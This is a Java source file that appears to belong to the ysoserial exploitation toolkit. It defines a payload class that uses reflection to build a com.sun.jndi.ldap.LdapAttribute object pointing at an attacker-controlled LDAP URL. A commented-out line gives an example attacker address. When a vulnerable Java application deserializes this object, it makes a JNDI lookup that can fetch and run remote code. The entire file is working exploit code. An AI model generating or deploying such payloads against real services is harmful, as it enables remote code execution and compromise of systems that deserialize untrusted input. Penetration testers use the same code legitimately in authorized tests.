package ysoserial.payloads;

import ysoserial.payloads.util.PayloadRunner;

import javax.naming.CompositeName;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;

public class LdapAttribute1 implements ObjectPayload<Object>{
    @Override
    public Object getObject(String command) throws Exception {
        // 构造反序列化payload
//        String ldapCtxUrl = "ldap://192.168.85.1:1389/f0uimq";
        String ldapCtxUrl = command;
        int sep = command.lastIndexOf('/');
        if ( sep < 0 ) {
            throw new IllegalArgumentException("Command format is: <base_url>/<classname>");
        }

        String cName = command.substring(sep + 1);



        Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
            new Class[] {String.class});
        ldapAttributeClazzConstructor.setAccessible(true);
        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
            new Object[] {"name"});

        Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField("baseCtxURL");
        baseCtxUrlField.setAccessible(true);
        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);

        Field rdnField = ldapAttributeClazz.getDeclaredField("rdn");
        rdnField.setAccessible(true);
        rdnField.set(ldapAttribute, new CompositeName(cName));

        return ldapAttribute;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(LdapAttribute1.class, args);
    }
}
